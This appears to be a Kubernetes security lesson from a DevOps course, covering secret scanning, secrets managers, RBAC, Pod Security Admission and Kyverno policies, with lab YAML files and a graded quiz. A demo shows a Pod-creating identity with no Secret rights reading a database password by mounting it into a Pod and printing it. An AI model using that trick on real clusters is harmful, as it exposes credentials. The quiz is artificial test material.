Watch a scanner miss it, then catch it. Gitleaks is a secret scanner: a tool that searches files for passwords and tokens. In a test repository, one commit added a GitHub token in `.env.local`, and the next commit deleted the file. A scan with `gitleaks dir` looks only at the files as they are now, and it said `no leaks found`. A scan with `gitleaks git` reads the whole history, and it said `leaks found: 1`, with the commit, the file and the line.

Better still, catch secrets before they reach the remote, with a pre-commit hook on your laptop: a script git runs before it records each commit. If the script fails, git makes no commit. The pre-commit tool installs such hooks from a settings file, and gitleaks ships a ready one. So you get two layers:
- gitleaks on your laptop as a pre-commit hook, so the bad commit never happens. Run `gitleaks git -v` once on every old repository too.
- GitHub push protection on the server. It blocks a push (an upload of commits) that contains a known secret format, such as cloud keys, tokens and private keys. For your own account it is on by default when you push to public repositories.

Both layers have holes. Scanners look for known formats and random-looking strings, so a plain password such as `summer2026` can slip through. Anyone can skip the hook by putting `SKIP=gitleaks` in front of `git commit`, and push protection lets you continue if you give a reason.

Treat them as a safety net, and keep secrets out of files in the first place. Local values go in a `.env` file, which the lab's `.gitignore` already tells git to ignore. So if secrets don't live in git, where do they live?

sections.h: Where secrets should live, and how they reach the cluster
sections.body:
Without one home, a secret spreads: a `.env` file on three laptops, a setting in the automatic build, a message in chat. When it leaks, nobody knows who had it, and rotating it means finding every copy. A secrets manager is one place that stores secrets, hands them out, rotates them and revokes them. Every read is logged, like the sign-in book at a bank's safe room. The common ones:
- HashiCorp Vault, the best-known one (Go deeper covers its license).
- OpenBao, an open source fork (a copy that went its own way) of Vault 1.14.
- Your cloud's own manager: AWS Secrets Manager, Google Secret Manager or Azure Key Vault.

The values live there, but Kubernetes still wants a Secret object, so something has to carry each value into the cluster. Three patterns are common. For each one, ask which file you can safely commit:
- External Secrets Operator (ESO). You commit an ExternalSecret that names a key in the manager. A controller fetches the value, writes a normal Secret, and fetches again on a timer. Git holds no secret at all.
- Sealed Secrets. `kubeseal` encrypts a Secret with the cluster controller's public key, and only that controller can decrypt it. You commit the SealedSecret.
- SOPS. It encrypts the values in a YAML settings file, leaving the field names readable, with age, PGP or a cloud key service. You commit the encrypted file and decrypt at deploy time.

A controller is a program in the cluster that keeps doing one job, over and over. A public key is the half of a key pair that anyone may hold, and it can lock but never open.

At work my default is ESO plus the cloud's secret manager. Rotation happens in one place, and nothing secret ever enters git. Sealed Secrets suits a small team with one cluster and no cloud manager. The lab's `security/external-secret-fake.yaml` practises the ESO pattern with ESO's fake provider, so you need no cloud account. Next: who may touch them?

sections.body:
The new helper in the shop gets a key to the front room and the storeroom, but not to the office. Kubernetes hands out keys with RBAC, role-based access control. For every request it asks one question: may this identity do this verb on this resource? A verb is an action such as get, list or create. A resource is a kind of object, such as pods or secrets. RBAC uses four objects:
- A Role lists rules, such as get, list and watch on pods, inside one namespace.
- A ClusterRole is the same, for the whole cluster.
- A RoleBinding gives a Role, or a ClusterRole, to a subject in one namespace.
- A ClusterRoleBinding gives a ClusterRole to a subject everywhere.

The subject is whoever gets the rights: a user, a group or a ServiceAccount. A ServiceAccount is an identity for a program: a Pod, a CI job, an AI agent.

The [official good practices](https://kubernetes.io/docs/concepts/security/rbac-good-practices/) fit in four lines:
1. Bind inside a namespace with a RoleBinding whenever you can.
2. Avoid wildcards. A `*` grants every resource type that exists today and every type added later.
3. Do not use `cluster-admin`, the built-in role that may do everything, for daily work.
4. Know the rights that are bigger than they look: creating Pods, `get` on `nodes/proxy`, and the verbs that change RBAC itself (`escalate`, `bind`, `impersonate`).

Each is a master key in disguise. A Pod creator can mount any Secret in the namespace and run the Pod as any of its ServiceAccounts. Access to `nodes/proxy` reaches the kubelet's own API, which can run commands in every Pod on that machine. The RBAC verbs let an identity hand itself more rights, or act as someone else. Even `list` or `watch` on Secrets reveals the values, because a list returns the full objects.

Two habits for ServiceAccounts. Give each app its own, never the namespace's `default`. Also, Kubernetes puts a token for the Pod's ServiceAccount into every container by default, as a file. Code in the Pod uses it to call the API. If the app never calls the Kubernetes API (hello-devops does not), set `automountServiceAccountToken: false`, so a broken-into Pod has no token to steal.

Test a rule before you rely on it. The command `kubectl auth can-i` (kubectl is the Kubernetes command-line tool) with `--as=system:serviceaccount:<namespace>:<name>` asks the API server directly what an identity may do. RBAC decides who may act. It can't look inside what they send, and that is the next gate.

sections.h: Admission control: a guard at the back door
sections.body:
At the shop's back door, a guard checks every delivery against the house rules (no glass, every box labelled), whoever sent it. Kubernetes has one too. Every request to the Kubernetes API passes three gates, in order:
1. Authentication: who are you? A certificate or a token answers.
2. Authorization: may you do this? RBAC answers.
3. Admission: is this particular object acceptable?

Admission control is that third gate. Admission controllers can change an object (mutating) or reject it (validating) before it is stored in etcd. RBAC decides whether you may create Deployments at all. Admission decides whether this Deployment is allowed, say one with `privileged: true` (full power over the machine) or an image tagged `:latest`.

Kubernetes has a built-in admission check made for Pod hardening: Pod Security Admission. It enforces the Pod Security Standards, which have three levels:
- privileged: no restrictions.
- baseline: blocks known ways to escape to the node (the machine), such as privileged containers and sharing the host's network.
- restricted: current hardening practice. Run as non-root, no privilege escalation, drop all Linux capabilities, use a seccomp profile.

Root is the all-powerful admin user on Linux. The restricted rules use three more Linux ideas:
- Capabilities split root's powers into named pieces, such as `NET_BIND_SERVICE` for ports below 1024.
- Privilege escalation is a process gaining more rights than its parent, for example by running `sudo`.
- seccomp filters the system calls a program may make, its requests to the kernel. `RuntimeDefault` is the runtime's standard filter.

You switch it on per namespace with labels such as `pod-security.kubernetes.io/enforce: baseline`. There are three modes: `enforce` rejects, `warn` shows the user a warning, and `audit` writes to the audit log.

Enforce mode has a trap: it checks Pods, never Deployments. A Deployment that breaks the rule is accepted, and then its Pods are refused, so `kubectl apply` says `configured` and nothing starts. Warn mode does check Deployments. I set `warn` one level stricter than `enforce`, so I see what would break next before anything does. Pod Security covers hardening and nothing else. Your own rules need one more tool.

sections.h: Writing your own house rules with Kyverno
sections.body:
A rule of your own, such as "no `:latest` tags" or "every workload has a team label", needs a policy engine: a program that checks objects against rules you write. With policy as code, those rules are files in git. You review them in pull requests, test them in CI (the automatic checks on every change), and the cluster enforces them. In the shop, the house rules move from the guard's memory into a binder that anyone can read.

The engine runs in the cluster as an admission webhook, a small web service. At the third gate, the API server sends it each matching request and waits for the answer: allow or deny. There are two common engines:
- Kyverno. Policies are Kubernetes YAML, and the checks are written in CEL, the short expression language Kubernetes itself uses.
- OPA Gatekeeper. Policies are written in Rego, a general policy language. A good fit where a company already uses OPA.

For a Kubernetes-only team I would pick Kyverno, because its policies look like the YAML files you already write. One warning: most Kyverno tutorials use `kind: ClusterPolicy`. [Kyverno 1.19](https://github.com/kyverno/website/blob/main/src/content/blog/announcing-kyverno-release-1.19/index.md) (August 2026) deprecated ClusterPolicy, and removal is planned for 1.20. The lab uses the CEL-based `ValidatingPolicy`.

Read `policy/disallow-latest-tag.yaml` in Files from the top:
- `validationActions: [Deny]` rejects a bad request. `Audit` lets it through and records a failure in a PolicyReport.
- `matchConstraints` picks namespace hello, and Pods plus the workloads that create Pods.
- `variables` finds the Pod spec (the part that describes the containers) inside any of those objects.
- `validations` are CEL expressions that must be true, each with a message for the user.

A guard follows the binder exactly, typos included. Switch a new policy straight to Deny for the whole cluster, and it blocks your own tools too. Argo CD syncs, the monitoring stack and even add-ons in kube-system get refused. **A new rule can lock out everyone, you included. Start in Audit.** Scope each policy to the namespaces it is meant for. Read the reports for a few days, fix what fails, and only then switch to Deny. Now let's gather all of Part 17 into one list.

sections.body:
Part 17 fits in a list you can tick, and you can prove each item with one command or one file:
1. No secrets in history: `gitleaks git -v` finds nothing, and push protection is on.
2. Pinned CI: every third-party action uses a full commit SHA, and Dependabot watches them.
3. Least-privilege CI: every workflow declares `permissions:`, and only the release job may write packages and attestations.
4. Known contents: every release has an SBOM, a passing scan and a signature, and `security/verify-release.sh` passes.
5. Secrets from a store: no Secret with a real value in git. ESO or Sealed Secrets creates them.
6. Narrow identities: each app has its own ServiceAccount, no token is mounted where it is not needed, and no Role uses `*`.
7. Hardened Pods: namespace hello warns on the restricted standard, and the hello-devops Deployment passes it.
8. Rules at the door: Kyverno denies `:latest`, and audits non-root and team labels.

Day 68 folds this list into your capstone. Every item makes an attack harder, and none makes it impossible. A person with the right keys can still make a bad change, and a policy only catches what someone thought to write down. Those limits matter more once the helper making changes is a program that writes code for you, and that is where the next part goes.

aside.title: If base64 hides nothing, why does Kubernetes use it?
aside.body: Base64 is there for carrying data, not for hiding it. A Secret can hold binary data, such as a certificate file, and raw bytes don't fit neatly inside a text format like YAML or JSON. Base64 turns any bytes into plain letters, digits and a few symbols, so they travel safely in a text file. Kubernetes also accepts plain text in a field called `stringData` and encodes it for you.

steps.say: Create a Secret in namespace hello and read it back. The value comes out base64 encoded, and one more command turns it back into the password.
steps.code:
$ kubectl -n hello create secret generic db-password --from-literal=password=hunter2-example
secret/db-password created
$ kubectl -n hello get secret db-password -o jsonpath='{.data.password}'
aHVudGVyMi1leGFtcGxl
$ kubectl -n hello get secret db-password -o jsonpath='{.data.password}' | base64 -d
hunter2-example

steps.say: Make a developer identity that may run Pods but has no rule about Secrets at all (`security/rbac-pod-creator.yaml` in Files). Then ask the API server what it may do. The `--as` flag acts as that identity for one request.
steps.code:
$ kubectl apply -f security/rbac-pod-creator.yaml
serviceaccount/dev created
role.rbac.authorization.k8s.io/pod-creator created
rolebinding.rbac.authorization.k8s.io/dev-pod-creator created
$ kubectl auth can-i get secrets -n hello --as=system:serviceaccount:hello:dev
no
$ kubectl auth can-i create pods -n hello --as=system:serviceaccount:hello:dev
yes

steps.say: Reading the Secret directly is refused, just as the Role intends.
steps.code:
$ kubectl -n hello get secret db-password --as=system:serviceaccount:hello:dev
Error from server (Forbidden): secrets "db-password" is forbidden: User "system:serviceaccount:hello:dev" cannot get resource "secrets" in API group "" in the namespace "hello"

steps.say: Now the same identity creates a Pod that loads the Secret into an environment variable (a named setting the program can read) and prints it. The API server accepts it, because creating Pods is allowed. The kubelet fetches the Secret on the Pod's behalf.
steps.code:
$ kubectl -n hello apply --as=system:serviceaccount:hello:dev -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata: {name: peek}
spec:
  restartPolicy: Never
  containers:
    - name: peek
      image: busybox:1.37
      command: ["sh", "-c", "echo The password is $PASSWORD"]
      env:
        - {name: PASSWORD, valueFrom: {secretKeyRef: {name: db-password, key: password}}}
EOF
pod/peek created

steps.say: Read the Pod's log, still as the developer. The password that the RBAC rule was meant to protect is right there.
steps.code:
$ kubectl -n hello logs peek --as=system:serviceaccount:hello:dev
The password is hunter2-example

steps.say: So the real boundary is the namespace, and the Secret rule alone protects nothing. Keep Secrets in namespaces where few people and programs can create Pods, and keep the real values in a secrets manager. Then clean up the demo.

pod "peek" deleted from hello namespace
secret "db-password" deleted from hello namespace
$ kubectl delete -f security/rbac-pod-creator.yaml

code.title: policy/disallow-latest-tag.yaml
code.src:
# Kyverno policy: every container image needs a fixed tag or a digest, and never :latest.
#
# Type: ValidatingPolicy (policies.kyverno.io/v1), the CEL-based type.
# The older ClusterPolicy type is deprecated since Kyverno 1.19, so the course does not use it.
# Scope: only namespace hello.
#
# Apply:  kubectl apply -f policy/disallow-latest-tag.yaml
# Check:  kubectl get validatingpolicies
# Try it: kubectl -n hello run test --image=nginx:latest   (Kyverno rejects it)
apiVersion: policies.kyverno.io/v1
kind: ValidatingPolicy
metadata:
  name: disallow-latest-tag
spec:
  # Deny = reject the request. Audit = allow it, but record a failure in a PolicyReport.
  validationActions:
    - Deny
  matchConstraints:
    # Kubernetes puts this label on every namespace, so it selects namespace hello only.
    namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: hello
    # Check Pods, and also the workloads that create Pods.
    # Then a bad Deployment fails at "kubectl apply" time, not later in a ReplicaSet event.
    resourceRules:
      - apiGroups: [""]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [pods]
      - apiGroups: [apps]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [deployments, statefulsets, daemonsets]
      - apiGroups: [batch]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [jobs, cronjobs]
  variables:
    # Find the Pod spec inside the object:
    # a CronJob has it at spec.jobTemplate.spec.template.spec,
    # a Deployment, StatefulSet, DaemonSet or Job at spec.template.spec,
    # and a Pod at spec.
    - name: podSpec
      expression: >-
        object.spec.?jobTemplate.?spec.?template.?spec.orValue(
        object.spec.?template.?spec.orValue(object.spec))
    # All containers, including init containers.
    - name: containers
      expression: >-
        variables.podSpec.containers +
        variables.podSpec.?initContainers.orValue([])
  validations:
    # Look only at the part after the last "/". It must contain ":" (a tag),
    # or the image must use "@" (a digest). The "/" matters: in
    # localhost:5000/hello-devops the ":" belongs to the registry port, not a tag.
    - expression: >-
        variables.containers.all(c,
        c.image.substring(c.image.lastIndexOf('/') + 1).contains(':') ||
        c.image.contains('@'))
      message: "Every image needs a tag or a digest, for example hello-devops:1.2.0."
    - expression: >-
        variables.containers.all(c, !c.image.endsWith(':latest'))
      message: "The :latest tag is not allowed. Use a fixed version tag, for example 1.2.0."

code.title: policy/require-run-as-nonroot.yaml
code.src:
# Kyverno policy: every container must promise to run as a non-root user.
# This is one rule of the Kubernetes "restricted" Pod Security Standard.
#
# Type: ValidatingPolicy (policies.kyverno.io/v1), the CEL-based type.
# Mode: Audit. Nothing is blocked. Failures show up in a PolicyReport, so you can
# fix what fails first and switch to Deny later.
# Scope: only namespace hello.
#
# Apply: kubectl apply -f policy/require-run-as-nonroot.yaml
# Read:  kubectl -n hello get policyreports -o wide
apiVersion: policies.kyverno.io/v1
kind: ValidatingPolicy
metadata:
  name: require-run-as-nonroot
spec:
  validationActions:
    - Audit
  # Also check objects that already exist, not only new requests.
  evaluation:
    background:
      enabled: true
  matchConstraints:
    namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: hello
    resourceRules:
      - apiGroups: [""]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [pods]
      - apiGroups: [apps]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [deployments, statefulsets, daemonsets]
      - apiGroups: [batch]
        apiVersions: [v1]
        operations: [CREATE, UPDATE]
        resources: [jobs, cronjobs]
  variables:
    # The Pod spec: at spec (Pod), spec.template.spec (Deployment and friends)
    # or spec.jobTemplate.spec.template.spec (CronJob).
    - name: podSpec
      expression: >-
        object.spec.?jobTemplate.?spec.?template.?spec.orValue(
        object.spec.?template.?spec.orValue(object.spec))
    - name: containers
      expression: >-
        variables.podSpec.containers +
        variables.podSpec.?initContainers.orValue([])
    # The Pod-level setting. Containers inherit it unless they set their own.
    - name: podNonRoot
      expression: >-
        variables.podSpec.?securityContext.?runAsNonRoot.orValue(false)
  validations:
    # Pass when the Pod does not say false, and every container ends up with
    # runAsNonRoot: true, either its own setting or the one inherited from the Pod.
    # A container that sets false fails, even when the Pod says true.
    - expression: >-
        variables.podSpec.?securityContext.?runAsNonRoot.orValue(true) == true &&
        variables.containers.all(c,
        c.?securityContext.?runAsNonRoot.orValue(variables.podNonRoot) == true)
      message: >-
        Set securityContext.runAsNonRoot: true on the Pod (spec.template.spec in a
        Deployment), or on every container.

code.title: security/rbac-pod-creator.yaml
code.src:
# A "developer" identity that may run Pods in namespace hello, but may NOT read Secrets.
# Day 64 uses it to show a trap: anyone who can create a Pod in a namespace can
# mount any Secret of that namespace into it, and so read the Secret anyway.
#
# Apply: kubectl apply -f security/rbac-pod-creator.yaml
# Test:  kubectl auth can-i get secrets -n hello --as=system:serviceaccount:hello:dev    (no)
#        kubectl auth can-i create pods -n hello --as=system:serviceaccount:hello:dev    (yes)
# Clean: kubectl delete -f security/rbac-pod-creator.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: dev
  namespace: hello
# Nothing runs as this account inside the cluster, so do not mount its token into Pods.
automountServiceAccountToken: false
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-creator
  namespace: hello
rules:
  # Run, look at and remove Pods, and read their logs. No rule mentions Secrets.
  - apiGroups: [""]
    resources: [pods]
    verbs: [get, list, watch, create, delete]
  - apiGroups: [""]
    resources: [pods/log]
    verbs: [get]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: dev-pod-creator
  namespace: hello
subjects:
  - kind: ServiceAccount
    name: dev
    namespace: hello
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: pod-creator

code.title: security/external-secret-fake.yaml
code.src:
# External Secrets Operator (ESO) practice, with no cloud account (Day 64).
#
# A SecretStore says WHERE secrets live. An ExternalSecret says WHICH values to copy
# into a normal Kubernetes Secret, and how often to refresh them.
#
# This file uses ESO's "fake" provider: it returns the values written below.
# That is for practice only. In real life the values live in a secrets manager
# (Vault, OpenBao, AWS Secrets Manager and so on), and this file holds only the
# store address and the key names, so it is safe to commit.
#
# Needs: ESO installed (Day 64 shows the Helm command).
# Apply: kubectl apply -f security/external-secret-fake.yaml
# Check: kubectl -n hello get externalsecret hello-api-token
#        kubectl -n hello get secret hello-api-token -o jsonpath='{.data.API_TOKEN}' | base64 -d
apiVersion: external-secrets.io/v1
kind: SecretStore
metadata:
  name: fake-store
  namespace: hello
spec:
  provider:
    fake:
      data:
        # Pretend this is the secrets manager. Two versions of the same key,
        # like a password before and after a rotation.
        - key: /hello-devops/api-token
          value: demo-token-v1
          version: v1
        - key: /hello-devops/api-token
          value: demo-token-v2
          version: v2
---
apiVersion: external-secrets.io/v1
kind: ExternalSecret
metadata:
  name: hello-api-token
  namespace: hello
spec:
  # Fetch again every minute, so a rotated value arrives quickly.
  refreshInterval: 1m
  secretStoreRef:
    kind: SecretStore
    name: fake-store
  # The Kubernetes Secret that ESO creates and keeps up to date.
  target:
    name: hello-api-token
    creationPolicy: Owner # delete the Secret when this ExternalSecret is deleted
  data:
    - secretKey: API_TOKEN # the key inside the Kubernetes Secret
      remoteRef:
        key: /hello-devops/api-token # the key in the secrets manager
        version: v1 # change to v2 to "rotate"

explain_back.prompt: Explain in 3 to 4 sentences how a password should travel from its owner to the hello-devops Pod, and who can read it on the way. Mention git, the secrets manager, RBAC and admission.
explain_back.answer: The password never goes into git. It lives in a secrets manager, and git holds only an ExternalSecret that names the key. External Secrets Operator fetches the value and writes a normal Kubernetes Secret in the namespace, where it is only base64 encoded. So RBAC matters twice: who may read Secrets, and who may create Pods in that namespace, because a Pod creator can mount and print any Secret there. Admission policies such as Pod Security and Kyverno then check every Pod that wants to use it, so a risky Pod is rejected before it ever runs.

recap: A Secret is base64, not encrypted, and anyone who can create Pods in its namespace can read it.
Deleting a leaked secret does not remove it from history: scan with gitleaks, use push protection, and rotate.
Real values live in a secrets manager. ESO, Sealed Secrets or SOPS bring them into the cluster without plain values in git.
RBAC: namespaced Roles, no wildcards, no daily cluster-admin, one ServiceAccount per app, and test with kubectl auth can-i.
Admission control checks each object. Pod Security Admission enforces the standards, and Kyverno runs your own rules.
Limits: scanners miss plain passwords, and a policy only catches what you wrote down. Roll out every policy in Audit first, then Deny.

interview.q: How do you manage secrets for applications on Kubernetes?
interview.a: I keep the real values in a secrets manager, such as Vault, OpenBao or the cloud provider's service, and never in git. External Secrets Operator syncs them into Kubernetes Secrets on a timer, so rotation happens in one place. In the cluster I turn on encryption at rest, limit who can read Secrets or create Pods per namespace, and give each app its own ServiceAccount. On the developer side, gitleaks runs as a pre-commit hook and push protection is on, and a leaked value is always rotated, not only deleted.

interview.q: What is the difference between RBAC and an admission policy engine like Kyverno?
interview.a: RBAC is authorization: it decides whether an identity may use a verb on a resource type, for example create Deployments in a namespace. Admission control runs after that and looks at the object itself, for example whether its image uses `:latest` or its Pod runs as root. Kyverno and Gatekeeper plug into admission and let you write those rules as code. You need both, and Kyverno's own docs say it does not replace RBAC.

interview.q: How would you roll out a new security policy without breaking teams?
interview.a: I write it as code in git, with test cases for good and bad objects, and review it like any change. I deploy it in Audit mode, scoped to the namespaces it is meant for, and read the PolicyReports to see what would fail. I share the results with the owning teams, help them fix their manifests, and add exceptions only with a reason and an owner. When the reports are clean, I switch to Deny, and I watch the policy engine's health because it now sits in the deploy path.

deeper.body:
First, two facts the main text left out. HashiCorp Vault has been source-available under the Business Source License since version 1.15, now with IBM as licensor. You may run it in production, unless you offer it to others as a service that competes with IBM's paid versions. OpenBao, the open source (MPL-2.0) fork of Vault 1.14, is hosted by the OpenSSF. And Kyverno became a CNCF graduated project in March 2026. Its CEL stands for Common Expression Language.

Two small details from the main text. The ServiceAccount token sits in each container under `/var/run/secrets/kubernetes.io/serviceaccount/`. In the lab's CEL, `.?` reads a field only if it exists, and `orValue()` gives the fallback.

Kubernetes has its own CEL policies. Since Kubernetes 1.30, ValidatingAdmissionPolicy is built in and stable. You write CEL checks in one object and bind them to resources with a ValidatingAdmissionPolicyBinding. The API server then runs them itself, with no webhook. Kyverno's ValidatingPolicy can do everything that one does, and more: background scans of existing objects, PolicyReports, exceptions, a command-line tool for tests, and calls to outside data. Kyverno can even turn a simple ValidatingPolicy into a built-in ValidatingAdmissionPolicy, so the API server runs it.

The CEL in the lab's two policies was tested exactly that way. The expressions went into a built-in policy on a test API server, which then got 17 test objects. It denied `nginx:latest`, a bare `nginx`, `localhost:5000/hello-devops` with no tag, and a `:latest` init container. It allowed a digest, a registry port with a tag, and anything in other namespaces. Testing a policy against good and bad examples costs very little. Make it a habit. In CI, the Kyverno CLI does the same job with `kyverno apply` and `kyverno test`.

Admission webhooks have a cost. Kyverno and Gatekeeper run as webhooks, so the API server calls them over the network for every matching request. If the webhook is down and its failure policy is Fail, matching requests fail too, including your own fixes. If the failure policy is Ignore, requests pass unchecked while it is down. You choose which risk to carry, and three habits make both smaller:
- Match only the resources and namespaces a policy needs. Never match everything in the cluster.
- Run more than one replica of the policy engine in production, and watch its health in Prometheus like any other service.
- Keep the policy engine's own namespace and kube-system out of its rules, so you can always repair the cluster.

Gatekeeper takes a different shape. A ConstraintTemplate holds Rego code and declares a new kind of object, for example one for required labels. A Constraint of that kind then says where the rule applies and with which settings. Gatekeeper ships a shared library of ready-made templates. Rego is a real language that takes time to learn. In return, the same OPA engine also decides for Terraform, Docker, SSH and your own APIs, which is why companies that already use OPA tend to stay with Gatekeeper.

lessons.closing:
We started with a safe code written in the order book and crossed out the next day. Now the passwords live in one logged store, git holds only the name of each key, and each key holder has just the doors they need. A guard checks every delivery against rules kept in git.

Look at one namespace you use today and run `kubectl auth can-i --list` as its app's ServiceAccount. Anything on that list you can't explain is a key to take back.

Next, we'll bring a new kind of helper into the shop: an AI assistant that writes code quickly and sometimes confidently wrong. How do you get its speed without trusting its every word?

quiz.q: Which step in the lab's release.yml stops a release whose image has a HIGH CVE with a fix available?
options: The cosign signing step
The Trivy scan step
The SBOM step
The attestation step
quiz.why: The Trivy step runs with severity HIGH and CRITICAL, ignore-unfixed and exit code 1, before anything is pushed.

quiz.q: Your image passed the scan with zero findings on release day. Two months later, what tells you whether it is still safe?
options: Re-scanning its stored SBOM
Checking its cosign signature
Reading the old workflow log
Comparing the image size
quiz.why: New CVEs appear after release, so you match the stored SBOM against today's vulnerability data.

quiz.q: You run cosign verify with the identity of release.yml at tag v1.2.0, but the image was signed by the run for v1.2.1. What happens?
options: It passes, because the repository matches
It passes, but prints a warning
It fails: no matching signature
It signs the image again for v1.2.0
quiz.why: The certificate identity includes the git ref, so a signature from another tag does not match.

quiz.q: Which statement about GitHub artifact attestations is true?
options: They prove the image has no vulnerabilities
They give SLSA Build L2, if someone verifies
They need a private key stored as a secret
They only work in private repositories
quiz.why: They are keyless Sigstore attestations at Build L2, and GitHub says they add nothing until they are verified.

quiz.q: A developer may create Pods in namespace billing but has no rule for Secrets. Can they learn the database password stored there?
options: No, RBAC blocks every path to it
Only if they are a cluster admin
Only if etcd encryption is off
Yes, by mounting it in a Pod
quiz.why: A Pod they create can load any Secret in the namespace, so Pod creation implies Secret access.

quiz.q: Which of these files is safe to commit to a public repository?
options: A Secret YAML with base64 values
A .env file with the real token
An ExternalSecret that names a key
A kubeconfig with a token inside
quiz.why: An ExternalSecret only points at a key in the secrets manager; the value never enters git.

quiz.q: You want to stop :latest images in namespace hello, but only after teams fix their manifests. How do you start?
options: A ValidatingPolicy in Audit mode
A ValidatingPolicy in Deny mode
A Pod Security enforce label
A Role without the create verb
quiz.why: Audit records failures in PolicyReports without blocking, so teams can fix things before you switch to Deny.

quiz.q: Kyverno is installed. Which question can it answer that RBAC cannot?
options: May this user create Pods here?
Does this Pod's image use a fixed tag?
Which groups does this user belong to?
Who issued this user's certificate?
quiz.why: RBAC checks who may do which verb on which resource type; admission policies look inside the object itself.

quiz.q: In GitHub Actions, why does the release job declare its own permissions: block?
options: To give its token only the rights it needs
To make the job start faster on the runner
Because GHCR rejects read-only tokens
Because OIDC tokens require write-all
quiz.why: Least privilege: the default stays read-only, and only this job may push packages, mint OIDC tokens and write attestations.

quiz.q: A Deployment's Pods are refused by Pod Security, so none start. Which command shows the reason fastest?
options: kubectl logs on the Deployment
kubectl top pods in the namespace
kubectl rollout undo on it
kubectl get events in the namespace
quiz.why: No Pod exists to have logs; the ReplicaSet's FailedCreate event carries the Pod Security message.
